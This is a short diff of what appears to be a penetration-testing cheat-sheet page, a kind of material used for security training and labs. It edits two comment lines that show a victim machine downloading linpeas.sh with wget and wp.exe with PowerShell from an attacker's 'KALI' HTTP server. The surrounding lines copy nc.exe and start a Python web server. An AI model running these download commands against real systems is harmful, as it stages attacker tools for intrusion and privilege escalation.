@@ -229,8 +229,8 @@ cp /usr/share/windows-resources/binaries/nc.exe .
 <span class="c"># Start server — never close this window:</span>
 python3 -m http.server 8080
 
-<span class="c"># Victim Linux downloads:   wget http://&lt;KALI&gt;:8080/linpeas.sh</span>
-<span class="c"># Victim Windows downloads:  (New-Object Net.WebClient).DownloadFile('http://&lt;KALI&gt;:8080/wp.exe','C:\Temp\wp.exe')</span></pre>
+<span class="c"># Victim Linux downloads:   wget http://$KALI:8080/linpeas.sh</span>
+<span class="c"># Victim Windows downloads:  (New-Object Net.WebClient).DownloadFile('http://$KALI:8080/wp.exe','C:\Temp\wp.exe')</span></pre>
       </div>
     </section>
 
